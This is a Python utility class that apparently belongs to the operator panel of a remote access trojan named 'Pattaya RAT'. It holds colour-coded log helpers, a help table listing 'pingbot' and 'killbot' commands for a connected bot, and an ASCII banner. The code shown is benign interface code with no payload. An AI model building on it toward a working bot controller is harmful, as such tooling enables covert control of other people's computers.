from datetime import datetime
from beautifultable import BeautifulTable



class PattayaPanelUtil:
    terminals = {}

    @staticmethod
    def setup(qtext_panel_browser, qtext_server_browser):
        PattayaPanelUtil._panel_log_viewer_instance = qtext_panel_browser
        PattayaPanelUtil._server_log_viewer_instance = qtext_server_browser
    
    @staticmethod
    def panel_log_info(message):
        current_time = datetime.now()
        formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
        PattayaPanelUtil._panel_log_viewer_instance.append(f'<p style="color: #33FF52;">[{formatted_time}] - [INFO] - [{message}]</p>')
        PattayaPanelUtil._panel_log_viewer_instance.ensureCursorVisible()

    @staticmethod
    def panel_log_error(message):
        current_time = datetime.now()
        formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
        PattayaPanelUtil._panel_log_viewer_instance.append(f'<p style="color: #E50A0A;">[{formatted_time}] - [ERROR] - [{message}]</p>')
        PattayaPanelUtil._panel_log_viewer_instance.ensureCursorVisible()


    @staticmethod
    def server_log_info(message):
        current_time = datetime.now()
        formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
        PattayaPanelUtil._server_log_viewer_instance.append(f'<p style="color: #33FFF6;">[{formatted_time}] - [INFO] - [{message}]</p>')
        PattayaPanelUtil._server_log_viewer_instance.ensureCursorVisible()


    @staticmethod
    def get_terminal_help():
        table = BeautifulTable()
        table.rows.append(["help", "Get Pattaya help terminal"])
        table.rows.append(["pingbot", "Handshake with current bot"])
        table.rows.append(["killbot", "Shutdown/Kill current bot"])
        table.columns.header = ["Command", "Description"]
        return "All terminal commands list\n" + str(table)

    @staticmethod
    def get_banner():
        return"""

  _____      _   _                      _____         _______ 
 |  __ \    | | | |                    |  __ \     /\|__   __|
 | |__) |_ _| |_| |_ __ _ _   _  __ _  | |__) |   /  \  | |   
 |  ___/ _` | __| __/ _` | | | |/ _` | |  _  /   / /\ \ | |   
 | |  | (_| | |_| || (_| | |_| | (_| | | | \ \  / ____ \| |   
 |_|   \__,_|\__|\__\__,_|\__, |\__,_| |_|  \_\/_/    \_\_|   
                           __/ |                              
                          |___/                               
                                Pattaya Terminal :)        
        """